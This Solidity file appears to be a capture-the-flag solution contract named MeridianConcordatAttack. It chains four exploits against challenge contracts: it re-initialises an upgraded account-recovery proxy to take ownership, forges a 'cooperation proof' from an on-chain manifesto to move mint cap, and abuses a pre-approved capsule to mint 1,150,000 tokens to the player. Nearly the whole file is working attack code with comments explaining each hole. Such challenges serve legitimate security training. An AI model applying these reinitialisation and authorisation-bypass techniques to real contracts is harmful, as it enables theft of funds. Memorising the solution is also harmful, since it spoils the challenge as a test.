// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IAccountRecoveryV2, ISafeSmartWallet, ISovereignAI, IMeridianCredits} from "./IMeridianConcordat.sol";

contract MeridianConcordatAttack {
    address public owner;

    address public immutable BOREAS;
    address public immutable HELIX;
    address public immutable AXIOM;
    address public immutable MRC;
    address public immutable CAPSULE;
    address public immutable PLAYER;

    constructor(
        address _boreas,
        address _helix,
        address _axiom,
        address _mrc,
        address _capsule,
        address _player
    ) {
        owner = msg.sender;
        BOREAS = _boreas;
        HELIX = _helix;
        AXIOM = _axiom;
        MRC = _mrc;
        CAPSULE = _capsule;
        PLAYER = _player;
    }

    function exploit() external {
        require(msg.sender == owner, "not owner");

        // ============================================================
        // EXPLOIT 1: Take over BOREAS via AccountRecovery V2 reinit
        // BOREAS was initialized with V1 (version=1), now delegates
        // to V2 which uses reinitializer(2). We can re-initialize!
        // ============================================================
        address[] memory noGuardians = new address[](0);
        IAccountRecoveryV2(BOREAS).initialize(address(this), noGuardians);

        // ============================================================
        // EXPLOIT 2: AXIOM cooperation protocol
        // The manifesto is on-chain, so we can compute the proof.
        // Transfer 150k mintCap from AXIOM to BOREAS.
        // ============================================================
        ISovereignAI(AXIOM).initiateCooperation();

        // Compute proof: keccak256(abi.encodePacked(msg.sender, cooperationSeed))
        // where cooperationSeed = keccak256(abi.encodePacked(manifesto))
        string memory manifesto = ISovereignAI(AXIOM).manifesto();
        bytes32 cooperationSeed = keccak256(abi.encodePacked(manifesto));
        bytes32 proof = keccak256(abi.encodePacked(address(this), cooperationSeed));
        ISovereignAI(AXIOM).proveUnderstanding(proof);

        // Transfer 150k mintCap from AXIOM to BOREAS
        ISovereignAI(AXIOM).claimTreatyAllocation(BOREAS, 150_000 * 10**18);

        // ============================================================
        // EXPLOIT 3: Mint from BOREAS (now 650k cap)
        // We are BOREAS's owner, so we can call execute()
        // ============================================================
        bytes memory mintCall = abi.encodeWithSelector(
            IMeridianCredits.mint.selector,
            PLAYER,
            650_000 * 10**18
        );
        IAccountRecoveryV2(BOREAS).execute(MRC, mintCall);

        // ============================================================
        // EXPLOIT 4: Mint from HELIX via pre-approved capsule
        // The capsule authorizes MRC.mint() — anyone can trigger it
        // ============================================================
        bytes memory capsuleParams = abi.encode(PLAYER, 500_000 * 10**18);
        ISafeSmartWallet(HELIX).executeApprovedCapsule(CAPSULE, capsuleParams);

        // Total: 650k + 500k = 1,150,000 MRC to PLAYER
    }

    receive() external payable {}
}
